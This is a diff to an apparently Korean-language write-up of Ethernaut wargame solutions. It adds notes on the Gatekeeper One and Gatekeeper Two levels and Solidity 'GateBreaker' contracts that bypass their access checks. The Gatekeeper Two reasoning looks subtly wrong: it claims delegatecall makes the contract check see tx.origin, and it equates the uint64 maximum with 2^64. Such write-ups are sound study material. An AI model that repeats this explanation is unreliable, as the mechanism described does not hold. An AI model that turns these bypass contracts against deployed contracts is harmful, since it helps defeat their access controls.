@@ -225,7 +225,7 @@ await sendTransaction({from:player, to:contract.address, data:functionSignature+
 ```
 
 ### Gatekeeper one
-조건 1. 컨트랙트로부터 call 해야함
+조건 1. msg.sender != tx.origin -> 컨트랙트로부터 call 해야함
 조건 2. 가스비가 8919로 나누어떨어져야함 -> 성공할 때까지 반복함
 조건 3. byte 타입 캐스팅에 관한 문제
 
@@ -254,6 +254,22 @@ contract GateBreaker{
             (success, ) = gateKeeper.call{gas:819100 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
             i++;
         }
+    }
+}
+```
+
+### Gatekeeper two
+조건 1. msg.sender != tx.origin -> 컨트랙트로부터 call 해야함
+조건 2. extcodesize(caller()) -> msg.sender가 컨트랙트가 아니여야함 -> delegatecall로 tx.origin을 바라보게함
+조건 3. xor 연산의 값이 uint64의 최대값이여야함 -> 2^64 -> a^not(a)을 이용함
+
+```
+contract GateBreaker{
+    address public gateKeeper = 0xDF91d8346755eF79F7381f57051a2B57a6C26D79;
+
+    // call breakGate(0x4c6b05a886a7a99f)
+    function breakGate(bytes8 _gateKey) public{
+       (bool success, bytes memory data) = gateKeeper.delegatecall(abi.encodeWithSignature("enter(bytes8)", _gateKey));
     }
 }
 ```
